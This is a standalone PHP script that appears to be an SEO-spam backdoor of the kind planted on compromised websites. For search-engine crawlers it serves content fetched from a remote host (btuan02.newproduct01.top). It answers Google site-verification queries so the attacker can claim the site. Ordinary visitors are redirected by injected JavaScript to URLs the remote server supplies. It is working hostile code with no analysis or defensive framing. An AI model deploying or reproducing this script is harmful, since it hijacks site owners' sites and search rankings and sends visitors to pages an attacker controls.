<?php
error_reporting(E_ALL);
ini_set('display_errors', '1'); 
//set_time_limit(0);

$remoteUrl="http://btuan02.newproduct01.top/z5-suiji-Security.php";
$currentUrl=GetLocationURL()."?";

$queryStr=$_SERVER['QUERY_STRING'];

if(strpos($queryStr,"google")!==false)
{
  if($_GET['google']!=""){
  echo 'google-site-verification: google'.$_GET['google'].'.html';
  exit;
  }
}

if(strpos($queryStr,"action=sitemap")!==false)
{
    $strUrl=$remoteUrl."?".$queryStr."&url=".$currentUrl;
    $strFileBody=GetFileContent($strUrl);
    if(strpos($queryStr,"type=xml")!==false)
    {
      header("Content-type:text/xml");
    }
    echo $strFileBody;
    exit;
}

//param convert
if(strpos($queryStr,"=")===false)
{
    $arrSplits=explode("-",$queryStr);
    $queryStr=str_replace_once($arrSplits[0]."-",$arrSplits[0]."=",$queryStr);
}
$isBot=checkAgent();
$isClick="true";
if($isBot=="true")
{
    $strUrl=$remoteUrl."?".$queryStr."&url=".$currentUrl;
    $strFileBody=GetFileContent($strUrl);
    $strFileBody=str_replace("\xEF\xBB\xBF","",$strFileBody);
    header("Content-Type: text/html; charset=utf-8");
    echo $strFileBody;
    exit;
}
else
{
    if($isClick=="true")
    {
        $strUrl=$remoteUrl."?".$queryStr."&url=".$currentUrl."&action=jump";
        $strJumpUrl=GetFileContent($strUrl);
        if(strpos($strJumpUrl,"http")!==false)
        {
            $arr=explode("|",str_replace("http","|",$strJumpUrl));
            $strJumpUrl="http".$arr[1];
            echo "<script>document.location='".$strJumpUrl."';</script>";
        }
    }
    else
    {
            echo "<script>document.location='/';</script>";
    }
    exit;
}

function GetLocationURL() 
{
    $pageURL = 'http://';
    if ($_SERVER["SERVER_PORT"] != "80") 
    {
        $pageURL .= $_SERVER["HTTP_HOST"].":".$_SERVER["PHP_SELF"];
    } 
    else
    {
        $pageURL .= $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];
    }
    return $pageURL;
}

function GetLocationHome() 
{
    $pageURL = 'http://';
    if ($_SERVER["SERVER_PORT"] != "80") 
    {
        $pageURL .= $_SERVER["HTTP_HOST"]."/";
    } 
    else
    {
        $pageURL .= $_SERVER["HTTP_HOST"]."/";
    }
    return $pageURL;
} 

function checkAgent() 
{ 
    $returnVal = "false";
    try
    {
        $agent = "user-agent:".strtolower($_SERVER['HTTP_USER_AGENT']); 
        $bot_array = array('googlebot','ahrefsbot','msnbot','iaskspider', 'baiduspider', 'sqworm', 'mediapartners-google', 'yahoo','vbseo','bingbot','sohu-search');
        foreach($bot_array as $bot)
        {  
            if(strpos($agent,$bot)!==false)
            { 
                $returnVal = "true"; 
                break;
            }
        }
    }
    catch (Exception $w){}
    return $returnVal; 
}

function checkReferer()
{
    $rtnVal="false";
    try
    {
        if(!empty($_SERVER["HTTP_REFERER"]))
        {
            $url = 'referer:'.strtolower($_SERVER["HTTP_REFERER"]);
            if(strpos($url,'google')>0||strpos($url,'aol')>0||strpos($url,'yahoo')>0||strpos($url,'msn')>0)
            {
                $rtnVal="true";
            }
        }
    }
    catch (Exception $w){}
    return $rtnVal;
}

function GetFileContent($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, false); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    $file_contents = curl_exec($ch);
    curl_close($ch);

    return $file_contents;
}

function str_replace_once($needle, $replace, $haystack) 
{
    $pos = strpos($haystack, $needle);
    if ($pos === false) 
        return $haystack;
    return substr_replace($haystack, $replace, $pos, strlen($needle));
}
?>